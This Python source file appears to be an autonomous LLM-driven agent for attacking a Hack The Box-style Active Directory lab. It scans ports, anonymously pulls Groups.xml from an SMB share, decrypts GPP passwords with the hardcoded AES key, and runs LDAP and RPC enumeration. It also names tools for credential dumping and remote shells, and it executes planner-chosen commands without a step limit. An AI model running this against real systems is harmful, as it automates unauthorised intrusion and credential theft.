import sys, json, time, re, logging, base64, hashlib
from pathlib import Path
from Crypto.Cipher import AES
from core.state_manager import StateManager, save_persistent_state
from utils.smart_executor import SmartCommandExecutor
from utils.exploit_matcher import ExploitMatcher
from nodes.dynamic_agent import LLMDecisionEngine, CommandSanitizer
from core.autonomy import AutonomyEngine
from core.reasoning import ReasoningState
from core.security import redact_secrets

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", handlers=[logging.StreamHandler(sys.stdout)])
logger=logging.getLogger("EnterpriseDynamicAgent")

MAX_STEPS=None  # Sin límite de pasos; la misión termina al detectar flag o por un safety stop.
MAX_SAME_ACTION_ATTEMPTS=3
MAX_PLANNER_RETRIES=2
MAX_NO_PROGRESS_STREAK=500
CANONICAL_SCAN="version_scan.txt"
LEGACY_SCANS=("full_recon.txt",)

class EnterpriseDynamicAgent:
    def __init__(self,target_ip:str,domain_name:str=None):
        self.target_ip=target_ip; self.domain_name=domain_name
        self.state_manager=StateManager(target_ip)
        state=self.state_manager.load_state()
        self.current_step=int(state.get("step_count",0))+1
        self.executor=SmartCommandExecutor(timeout_minutes=20,poll_interval=15)
        self.exploit_matcher=ExploitMatcher(target_ip)
        self.autonomy=AutonomyEngine(target_ip)
        self.reasoning=ReasoningState(state)
        self.recovery_index=0

    def extract_domain_from_scan(self,scan_content:str):
        if self.domain_name:return
        m=re.search(r"Domain:\s*([a-zA-Z0-9.-]+\.[a-zA-Z]+)",scan_content,re.I)
        self.domain_name=m.group(1).lower() if m else "active.htb"
        if m:self.state_manager.update_etc_hosts(domain_name=self.domain_name)

    def decrypt_gpp_password(self,cpassword:str)->str:
        try:
            decoded=base64.b64decode(cpassword+"="*((4-len(cpassword)%4)%4))
            key=(b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
                 b"\xf4\x96\xae\x0a\x3d\x7e\x1c\xf7\xfe\xee\x1f\xd3\xfa\x06\x30\x7c")
            d=AES.new(key,AES.MODE_CBC,b"\x00"*16).decrypt(decoded); n=d[-1]
            return d[:-n].decode("utf-16le",errors="ignore")
        except Exception:return None

    def parse_loot_for_credentials(self):
        creds={"username":None,"password":None}; loot=Path(f"testing/{self.target_ip}/loot")
        if not loot.exists():return creds
        for p in loot.glob("**/*.xml"):
            try:
                s=p.read_text(encoding="utf-8",errors="ignore")
                u=re.search(r'userName="([^"]+)"',s,re.I); cp=re.search(r'cpassword="([^"]+)"',s,re.I)
                if u:creds["username"]=u.group(1)
                if cp:creds["password"]=self.decrypt_gpp_password(cp.group(1))
            except Exception:continue
        return creds

    @staticmethod
    def fingerprint(command):
        return hashlib.sha256(re.sub(r"\s+"," ",command.strip()).encode()).hexdigest()[:16]

    def scan_path(self):
        p=Path(f"testing/{self.target_ip}/scans/{CANONICAL_SCAN}")
        if p.exists():return p
        for name in LEGACY_SCANS:
            q=p.parent/name
            if q.exists():
                logger.info("[+] Recon legacy detectado: %s; se considera completado.",q)
                return q
        return p

    def ensure_potential_exploits(self,scan:Path):
        """Genera el informe de posibles vectores una vez disponible el scan."""
        report=Path(f"testing/{self.target_ip}/loot/potential_exploits.json")
        if report.exists():return
        try:
            text=scan.read_text(encoding="utf-8",errors="ignore")
            self.exploit_matcher.analyze_scan_output(text)
        except Exception as exc:
            logger.warning("[!] No se pudo generar potential_exploits.json: %s",exc)

    def flags_found(self):
        root=Path(f"testing/{self.target_ip}")
        if not root.exists(): return []
        found=[]
        filename_patterns=("user.txt","root.txt","local.txt","proof.txt","flag.txt","flags.json","user.flag","root.flag")
        flag_re=re.compile(r"(?:flag|htb)\{[^}]{4,200}\}",re.I)
        for p in root.rglob("*"):
            if not p.is_file(): continue
            if p.name.lower() in filename_patterns:
                found.append(str(p)); continue
            try:
                if p.stat().st_size>2_000_000: continue
                data=p.read_text(encoding="utf-8",errors="ignore")
                if flag_re.search(data): found.append(str(p))
            except (OSError,UnicodeError): continue
        return sorted(set(found))

    def load_potential_exploit(self):
        """Carga candidatos de SearchSploit como metadata; nunca los trata como comandos ejecutables."""
        paths=(Path(f"testing/{self.target_ip}/loot/potential_exploits.json"),Path(f"testing/{self.target_ip}/potential_exploits.json"),Path("potential_exploits.json"))
        for path in paths:
            if not path.exists():
                continue
            try:
                data=json.loads(path.read_text(encoding="utf-8"))
                candidates=[]
                groups=data if isinstance(data,dict) else {"unknown":data}
                for service,value in groups.items():
                    if not isinstance(value,list):
                        continue
                    for item in value:
                        if isinstance(item,dict):
                            candidates.append({"service":service,"title":item.get("Title") or item.get("title","") ,"path":item.get("Path") or item.get("path","") ,"codes":item.get("Codes") or item.get("codes","")})
                        elif isinstance(item,str):
                            candidates.append({"service":service,"title":item,"path":"","codes":""})
                if candidates:
                    return {"available":True,"source":str(path),"candidate_count":len(candidates),"candidates":candidates[:12]}
            except (OSError,json.JSONDecodeError) as exc:
                logger.warning("[!] No se pudo leer %s: %s",path,exc)
        return {"available":False,"source":"","candidate_count":0,"candidates":[]}

    @staticmethod
    def action_family(command):
        text=re.sub(r"\s+"," ",command.lower().strip())
        if any(x in text for x in ("ntpdate","timedatectl","chronyc")):
            return "ntp_time_synchronization"
        if any(x in text for x in ("psexec","wmiexec","smbexec","evil-winrm","winrm","xfreerdp","rdesktop")):
            return "remote_session_access"
        if any(x in text for x in ("--users","enumdomusers","enumerate users","objectclass=user")):
            return "enumerate_domain_users"
        if any(x in text for x in ("--groups","enumdomgroups","enumerate groups","objectclass=group")):
            return "enumerate_domain_groups"
        if any(x in text for x in ("--shares","smbclient -l","smbmap")):
            return "enumerate_smb_shares"
        if "replication" in text and ("smbclient" in text or "mget" in text):
            return "retrieve_replication_artifacts"
        if "groups.xml" in text or "gpp-decrypt" in text:
            return "analyze_gpp_artifacts"
        if "getuserspns" in text or "kerberoast" in text:
            return "kerberos_spn_enumeration"
        if "getnpusers" in text or "asreproast" in text:
            return "asrep_enumeration"
        if "bloodhound" in text:
            return "ad_graph_collection"
        if "secretsdump" in text:
            return "credential_dump_analysis"
        if "ldapsearch" in text:
            return "ldap_query"
        if "rpcclient" in text:
            return "rpc_enumeration"
        return re.sub(r"\s+"," ",text)[:160]

    @staticmethod
    def action_goal(command):
        """Clasifica el objetivo de conocimiento, independientemente de la herramienta usada."""
        family=EnterpriseDynamicAgent.action_family(command)
        if family in {"enumerate_domain_users","enumerate_domain_groups","enumerate_smb_shares",
                      "retrieve_replication_artifacts","analyze_gpp_artifacts","kerberos_spn_enumeration",
                      "asrep_enumeration","ad_graph_collection","credential_dump_analysis","remote_session_access",
                      "rpc_enumeration","ldap_query"}:
            return family
        if family=="ntp_time_synchronization":
            return family
        return None

    @staticmethod
    def _successful_entry(entry):
        rc=entry.get("returncode")
        status=str(entry.get("status","")).lower()
        output=str(entry.get("output","")).strip()
        return (rc == 0 or status in {"success","completed","ok"}) and bool(output)

    def completed_goals(self,history):
        goals=set()
        for entry in history:
            cmd=entry.get("command","")
            goal=self.action_goal(cmd) if cmd else None
            if goal and self._successful_entry(entry):
                goals.add(goal)
        return goals

    def semantic_repeats(self,history,command):
        family=self.action_family(command)
        return sum(self.action_family(h.get("command",""))==family for h in history if h.get("command"))

    def persist_planner_state(self,state,**updates):
        planner_state=dict(state.get("planner_state") or {})
        planner_state.update(updates)
        new_state={**state,"planner_state":planner_state}
        save_persistent_state(new_state)
        return new_state

    def tactical_fallback(self,state):
        """Plan táctico determinista para que el agente siga actuando si el LLM se atasca.

        Estas acciones son de descubrimiento/enum; el LLM sigue siendo libre de
        elegir la táctica cuando responde correctamente. El fallback solo evita
        que un fallo de planificación convierta una auditoría en un estado muerto.
        """
        history=state.get("history",[])
        executed={re.sub(r"\s+"," ",h.get("command","").strip()) for h in history if h.get("command")}
        scan=self.scan_path()
        scan_text=scan.read_text(encoding="utf-8",errors="ignore").lower() if scan.exists() else ""
        domain=self.domain_name or "active.htb"
        base_dn=",".join(f"DC={part}" for part in domain.split("."))
        candidates=[]

        if "389/tcp" in scan_text or "636/tcp" in scan_text or "3268/tcp" in scan_text:
            candidates.extend([
                (f"ldapsearch -x -H ldap://{self.target_ip} -s base namingContexts defaultNamingContext dnsHostName","fallback.ldap_rootdse"),
                (f'ldapsearch -x -H ldap://{self.target_ip} -b "{base_dn}" "(objectClass=user)" sAMAccountName userPrincipalName servicePrincipalName',"fallback.ldap_users"),
                (f'ldapsearch -x -H ldap://{self.target_ip} -b "{base_dn}" "(objectClass=group)" cn member',"fallback.ldap_groups"),
            ])
        if "445/tcp" in scan_text or "139/tcp" in scan_text:
            candidates.extend([
                (f"smbclient -L //{self.target_ip} -N","fallback.smb_shares"),
                (f"enum4linux -U -S -P {self.target_ip}","fallback.enum4linux"),
            ])
        if "135/tcp" in scan_text:
            candidates.extend([
                (f"rpcclient -U '' -N {self.target_ip} -c 'srvinfo'","fallback.rpc_info"),
                (f"rpcclient -U '' -N {self.target_ip} -c 'enumdomusers'","fallback.rpc_users"),
                (f"rpcclient -U '' -N {self.target_ip} -c 'enumdomgroups'","fallback.rpc_groups"),
            ])

        for command,action_id in candidates:
            normalized=re.sub(r"\s+"," ",command.strip())
            if normalized not in executed:
                logger.warning("[TACTICAL_FALLBACK] LLM estancado; ejecutando %s.",action_id)
                return command,"fallback",action_id
        return None

    def recovery_action(self,state):
        """Adquisición de evidencia sin depender del LLM."""
        history=state.get("history",[])
        executed={re.sub(r"\s+"," ",h.get("command","").strip()) for h in history if h.get("command")}
        planner_state=state.get("planner_state") or {}
        attempted=set(planner_state.get("recovery_attempts",[]))
        scan=self.scan_path()
        scan_text=scan.read_text(encoding="utf-8",errors="ignore").lower() if scan.exists() else ""
        candidates=[]
        if "389/tcp" in scan_text or "636/tcp" in scan_text or "3268/tcp" in scan_text:
            candidates.append((f"ldapsearch -x -H ldap://{self.target_ip} -s base namingContexts defaultNamingContext dnsHostName","recovery.ldap_rootdse"))
        if "445/tcp" in scan_text or "139/tcp" in scan_text:
            candidates.append((f"smbclient -L //{self.target_ip} -N","recovery.smb_shares"))
        if "135/tcp" in scan_text:
            candidates.append((f"rpcclient -U '' -N {self.target_ip} -c 'srvinfo'","recovery.rpc_info"))
        for command,action_id in candidates:
            normalized=re.sub(r"\s+"," ",command.strip())
            if action_id in attempted or normalized in executed:
                continue
            new_planner_state={**planner_state,"status":"RECOVERY","recovery_attempts":sorted(attempted|{action_id}),"last_reason":action_id}
            save_persistent_state({**state,"planner_state":new_planner_state})
            logger.warning("[RECOVERY] Planner estancado; reservando %s como única recuperación nueva.",action_id)
            return command,"recovery",action_id
        return None

    def autonomous_fallback(self,state,potential_exploit=None):
        history=state.get("history",[]); blocked=[]
        for h in history[-20:]:
            cmd=h.get("command","")
            if cmd: blocked.append(re.sub(r"\s+"," ",cmd.strip()))
        planner=LLMDecisionEngine()
        planner_state=state.get("planner_state") or {}
        blocked_actions=set(planner_state.get("blocked_actions",[]))
        autonomy_context=self.autonomy.context(state)
        reasoning_context=self.reasoning.context()
        planner_context=("No hay flag todavía. Debes continuar la auditoría. NO declares mission_complete hasta detectar una flag. "
                         "Una acción exitosa NO significa que el objetivo semántico esté agotado: puedes y debes usar otra consulta/herramienta "
                         "si aporta una dimensión distinta de evidencia. No conviertas ldap_query, SMB, RPC ni enumeración en objetivos de una sola ejecución. "
                         "Si no puedes proponer una acción nueva, devuelve command vacío y el supervisor activará un fallback táctico. "
                         "El LLM conserva libertad táctica para elegir el siguiente objetivo y herramienta; el supervisor impide repeticiones estériles. "
                         f"Estado de autonomía: {json.dumps(autonomy_context, ensure_ascii=False)}. "
                         f"Modelo del mundo: {json.dumps(reasoning_context, ensure_ascii=False)}. "
                         "Comandos ya ejecutados y que NO debes repetir exactamente: "+json.dumps(blocked)+"\n")
        if potential_exploit and potential_exploit.get("available"):
            planner_context += ("Potential_exploit es SOLO metadata de candidatos y requiere validación contra evidencia; nunca lo trates como comando ejecutable. Candidatos: "+json.dumps(potential_exploit,ensure_ascii=False)[:6000])
        augmented_history=list(history)
        augmented_history.append({"step":state.get("step_count",0),"command":"[PLANNER_CONTEXT]","output":planner_context})
        for _ in range(MAX_PLANNER_RETRIES):
            try:
                decision=planner.consult_tactical_next_step(self.target_ip,augmented_history,state.get("last_output",""),potential_exploit=potential_exploit,reasoning_context=reasoning_context) or {}
            except Exception as exc:
                logger.exception("[!] Planner exception: %s",exc)
                break
            cmd=CommandSanitizer.clean(str(decision.get("command","") or ""))
            if not cmd:
                augmented_history.append({"step":state.get("step_count",0),"command":"[REJECTED_EMPTY]","output":"El planner no propuso una acción."})
                continue
            normalized=re.sub(r"\s+"," ",cmd.strip())
            action_id=f"llm.{self.fingerprint(cmd)}"
            if action_id in blocked_actions:
                augmented_history.append({"step":state.get("step_count",0),"command":"[REJECTED_BLOCKED_ACTION]","output":f"Acción bloqueada: {action_id}"})
                continue
            if normalized in blocked:
                blocked_actions.add(action_id)
                augmented_history.append({"step":state.get("step_count",0),"command":"[REJECTED_DUPLICATE]","output":f"Comando ya ejecutado: {cmd}"})
                continue
            return cmd,"autonomous",action_id
        stalled=int(planner_state.get("stalled_attempts",0))+1
        updated=self.persist_planner_state(
            state,
            status="STALLED",
            stalled_attempts=stalled,
            blocked_goals=list(planner_state.get("blocked_goals",[])),
            blocked_actions=sorted(blocked_actions),
            last_reason="no_new_action"
        )
        logger.warning("[!] Planner agotó sus %d reintentos sin una acción nueva.",MAX_PLANNER_RETRIES)
        fallback=self.tactical_fallback(updated)
        if fallback:
            return fallback
        return self.recovery_action(updated)

    def determine_next_action(self,state):
        history=state.get("history",[]); commands=[h.get("command","") for h in history]
        potential=self.load_potential_exploit()
        self.current_potential_exploit=potential

        scan=self.scan_path()
        if not scan.exists():
            return (f"nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN testing/{self.target_ip}/scans/{CANONICAL_SCAN} {self.target_ip}","recon","recon.version")
        self.extract_domain_from_scan(scan.read_text(encoding="utf-8",errors="ignore"))
        self.ensure_potential_exploits(scan)
        domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
        if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
            return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
        # Las nuevas credenciales/capacidades ya no disparan una receta fija.
        # Se entregan al modelo del mundo y al razonador para que determine qué
        # hipótesis merece ser investigada a continuación.
        # Recargar el modelo del mundo persistido: cada ciclo razona sobre el estado actual.
        self.reasoning=ReasoningState(state)
        planner_state={**state,"potential_exploit":potential}
        fallback=self.autonomous_fallback(planner_state,potential_exploit=potential)
        if fallback:return fallback
        return "","autonomous","planner.stalled"

    def run_autonomous_loop(self):
        while MAX_STEPS is None or self.current_step<=MAX_STEPS:
            state=self.state_manager.load_state()
            if state.get("mission_complete"):return
            flags=self.flags_found()
            if flags:
                self.state_manager.mark_complete("flag_found:"+flags[0],self.current_step); logger.info("[+] FLAG DETECTADA: %s",flags[0]); return
            command,phase,action_id=self.determine_next_action(state)
            if not command:
                planner_state=state.get("planner_state") or {}
                stalls=int(planner_state.get("stalled_attempts",0))
                logger.error("[!] No existe una acción nueva ni una recuperación disponible. Estado=%s; deteniendo misión para evitar ciclo.",planner_state.get("status","UNKNOWN"))
                self.persist_planner_state(state,status="EXHAUSTED",stalled_attempts=stalls,last_reason="no_action_and_no_recovery")
                return
            attempts=state.get("action_attempts",{}).get(action_id,0); recent=state.get("history",[]); fp=self.fingerprint(command)
            repeats=sum(self.fingerprint(h.get("command",""))==fp for h in recent[-6:])
            if attempts>=MAX_SAME_ACTION_ATTEMPTS or repeats>=MAX_SAME_ACTION_ATTEMPTS:
                logger.warning("[!] Acción repetida bloqueada: %s. Se fuerza replanning autónomo.",action_id)
                state.setdefault("history",[]).append({"step":self.current_step,"command":"[BLOCKED_DUPLICATE]","output":f"Acción bloqueada: {command}"})
                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False); self.current_step+=1; continue

            # Bloqueo semántico: distintas implementaciones que intentan la misma
            # transformación no cuentan como acciones nuevas cuando la ejecución
            # anterior no produjo evidencia nueva.
            action_intent=ReasoningState.action_intent(command)
            semantic_repeat=any(
                h.get("action_intent")==action_intent
                and h.get("no_new_evidence") is True
                and int(h.get("step", -999)) >= self.current_step - 3
                for h in recent[-6:]
            )
            if semantic_repeat:
                logger.warning("[!] Acción semánticamente repetida sin evidencia nueva: %s",action_intent)
                blocked_entry={"step":self.current_step,"command":"[BLOCKED_SEMANTIC_REPEAT]","output":f"Intent bloqueado: {action_intent}","action_intent":action_intent}
                self.state_manager.save_state(self.current_step,blocked_entry,"autonomous",False)
                self.current_step+=1
                continue
            step_limit = str(MAX_STEPS) if MAX_STEPS is not None else "∞"
            logger.info("[*] Paso %d/%s | %s | %s",self.current_step,step_limit,action_id,redact_secrets(command))
            if not CommandSanitizer.validate_command_safety(command):
                logger.error("[!] Política de ejecución bloqueó la acción; misión detenida sin marcarse como completada.")
                self.persist_planner_state(state,status="EXHAUSTED",last_reason="command_policy_blocked")
                return
            result=self.executor.execute_with_polling(command); output=result.get("stdout","")
            if result.get("stderr"):output+="\nSTDERR:\n"+result["stderr"]
            output_digest=hashlib.sha256(re.sub(r"\s+"," ",output).encode("utf-8",errors="ignore")).hexdigest()[:16] if output else ""
            action_intent=ReasoningState.action_intent(command)
            raw_entry={"step":self.current_step,"action_id":action_id,"action_intent":action_intent,"command":command,"output":output[:8000],"output_digest":output_digest,"status":result.get("status"),"returncode":result.get("returncode")}
            autonomy_update=self.autonomy.observe(state, raw_entry)
            raw_entry["no_new_evidence"]=not bool(autonomy_update.get("last_progress"))
            reasoning_update=self.reasoning.update(output, state.get("history",[]) + [raw_entry])
            persisted_entry=redact_secrets(raw_entry)
            previous_planner_state=dict(state.get("planner_state") or {})
            progress_streak=int(autonomy_update.get("no_progress_streak",0))
            if autonomy_update.get("last_progress"):
                planner_status="PROGRESS"; planner_stalls=0; reason="new_evidence"
            else:
                planner_status="NO_PROGRESS"; planner_stalls=int(previous_planner_state.get("stalled_attempts",0))+1; reason="no_new_evidence"
            next_planner_state={
                **previous_planner_state,
                "status":planner_status,
                "stalled_attempts":planner_stalls,
                "no_progress_streak":progress_streak,
                "blocked_goals":list(previous_planner_state.get("blocked_goals",[])),
                "blocked_actions":list(previous_planner_state.get("blocked_actions",[])),
                "recovery_attempts":list(previous_planner_state.get("recovery_attempts",[])),
                "last_reason":reason,
            }
            self.state_manager.save_state(self.current_step,persisted_entry,phase,False,extra={"last_action_id":action_id,"last_command_fingerprint":fp,"action_attempts":{**state.get("action_attempts",{}),action_id:attempts+1},"potential_exploit":getattr(self,"current_potential_exploit",{"available":False,"candidate_count":0,"candidates":[]}),"autonomy":autonomy_update,"reasoning":reasoning_update,"planner_state":next_planner_state})
            if progress_streak >= MAX_NO_PROGRESS_STREAK:
                logger.error("[!] Presupuesto de progreso agotado (%d pasos sin evidencia nueva); deteniendo misión para evitar ciclo táctico.",progress_streak)
                self.persist_planner_state({**state,"autonomy":autonomy_update},status="EXHAUSTED",stalled_attempts=planner_stalls,no_progress_streak=progress_streak,last_reason="progress_budget_exhausted")
                return
            self.current_step+=1; time.sleep(1)
        if MAX_STEPS is not None:
            logger.warning("[!] Límite de seguridad de %d pasos alcanzado sin flag; la misión NO se marca como completada.",MAX_STEPS)

if __name__=="__main__":
    EnterpriseDynamicAgent(sys.argv[1] if len(sys.argv)>1 else "10.129.9.175").run_autonomous_loop()
